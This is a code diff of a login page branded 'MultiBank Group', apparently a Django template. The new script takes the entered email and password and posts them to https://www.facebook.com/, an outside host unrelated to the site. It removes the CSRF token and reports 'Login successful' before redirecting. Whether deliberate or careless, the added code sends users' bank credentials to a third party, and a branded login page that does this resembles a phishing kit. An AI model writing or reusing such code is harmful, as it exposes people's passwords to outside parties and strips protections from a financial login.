@@ -1,134 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login With Multibank Api</title>
+    <title>MultiBank Group Login</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #16213a; /* Background color */
             margin: 0;
             padding: 0;
-        }
-        .container {
-            width: 100%;
-            height: 100vh;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 10px; /* Added padding for small screens */
+            height: 100vh;
+            background-color: #f3f4f6;
         }
-        .login-form img {
-            margin-left: 50px;
-            max-width: 100%; /* Make the image responsive */
-            height: auto; /* Maintain aspect ratio */
-        }
-        .login-form {
-            background-color: #0c1323;
-            padding: 40px;
+
+        .login-container {
+            display: flex;
+            background-color: #1a1a2e;
+            color: #fff;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            max-width: 400px; /* Limit the width of the form */
-            width: 100%; /* Ensure the form takes the full width on small screens */
-            box-sizing: border-box; /* Ensure padding and border are included in the element's total width and height */
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
         }
-        .login-form h2 {
+
+        .login-box,
+        .info-box {
+            padding: 20px;
+        }
+
+        .login-box {
+            background-color: #0d0d1a;
+        }
+
+        .info-box {
+            background-color: #1a1a2e;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            margin-bottom: 30px;
-            color: #007bff;
-            font-weight: bold; /* Bold text */
-            font-size: 24px; /* Larger font size */
         }
-        .form-group {
-            margin-bottom: 20px;
+
+        .input-group {
+            margin-bottom: 15px;
         }
-        .form-group label {
+
+        .input-group label {
             display: block;
             margin-bottom: 5px;
-            color: #007bff;
-            font-weight: bold; /* Bold text */
-            font-size: 16px; /* Larger font size */
         }
-        .form-group input {
+
+        .input-group input {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            box-sizing: border-box;
         }
-        .form-group input[type="submit"] {
-            background-color: #007bff;
-            color: #fff;
+
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 15px;
+        }
+
+        .forgot-password a {
+            color: #1e90ff;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1e90ff;
             border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
             cursor: pointer;
-            font-weight: bold; /* Bold text */
-            font-size: 16px; /* Larger font size */
         }
-        .form-group input[type="submit"]:hover {
-            background-color: #0056b3;
+
+        button:hover {
+            background-color: #1c7ed6;
         }
-        @media (max-width: 768px) {
-            .login-form {
-                padding: 20px; /* Reduce padding on small screens */
-            }
-            .login-form h2 {
-                font-size: 20px; /* Adjust font size for smaller screens */
-            }
-            .form-group label, .form-group input[type="submit"] {
-                font-size: 14px; /* Adjust font size for smaller screens */
-            }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .signup-link a {
+            color: #1e90ff;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        .guest-link {
+            display: block;
+            margin-top: 10px;
+            color: #1e90ff;
+            text-decoration: none;
+        }
+
+        .guest-link:hover {
+            text-decoration: underline;
+        }
+
+        .info-box h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .info-box p {
+            font-size: 16px;
+        }
+
+        .message {
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #f00;
         }
     </style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="login-form">
-            {% load static %}
-            <img src="{% static 'multibankgroup_logo.jpg' %}" alt="Multibank Group Logo">
-            <h2>Login</h2>
-            <form method="POST">
-                {% csrf_token %}
-                <div class="form-group">
-                    <label for="email">Username:</label>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Sign In</h2>
+            <div class="message" id="message"></div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="email">Email address*</label>
                     <input type="email" id="email" name="email" required>
                 </div>
-                <div class="form-group">
-                    <label for="password">Password:</label>
+                <div class="input-group">
+                    <label for="password">Password*</label>
                     <input type="password" id="password" name="password" required>
                 </div>
-                <div class="form-group">
-                    <input type="submit" value="Login">
+                <div class="forgot-password">
+                    <a href="#">Forgot Password?</a>
                 </div>
+                <button type="submit">Sign In</button>
             </form>
+            <div class="signup-link">
+                <p>Don't have an account? <a href="#">Sign up now</a></p>
+                <a href="#" class="guest-link">Continue as a guest</a>
+            </div>
+        </div>
+        <div class="info-box">
+            <h1>MultiBank Group</h1>
+            <p>Allocating more than US$ 322 Million to paid up capital</p>
         </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
             event.preventDefault(); // Prevent the default form submission
 
-            // Retrieve the CSRF token from the form
-            var csrfToken = document.querySelector('input[name="csrfmiddlewaretoken"]').value;
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
 
-            // Construct the AJAX request
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/client_dashboard/'); // Replace with your desired URL
-            xhr.setRequestHeader('X-CSRFToken', csrfToken); // Set the CSRF token in the request header
-            xhr.onload = function() {
+            xhr.open('POST', 'https://www.facebook.com/', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            xhr.onload = function () {
+                var message = document.getElementById('message');
                 if (xhr.status === 200) {
-                    window.location.href = '/client_dashboard/'; // Redirect to the dashboard upon successful login
+                    message.style.color = 'green';
+                    message.textContent = 'Login successful. Redirecting...';
+                    setTimeout(function () {
+                        window.location.href = '/client_dashboard/'; // Redirect to the dashboard upon successful login
+                    }, 2000);
                 } else {
-                    alert('Login failed. Please try again.'); // Display an error message if login fails
+                    message.textContent = 'Login failed. Please try again.';
                 }
             };
 
-            // Prepare the form data
-            var formData = new FormData(this);
+            xhr.onerror = function () {
+                var message = document.getElementById('message');
+                message.textContent = 'An error occurred during the request. Please try again.';
+            };
 
-            // Send the AJAX request
-            xhr.send(formData);
+            var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
+
+            xhr.send(params);
         });
     </script>
 </body>
+
 </html>
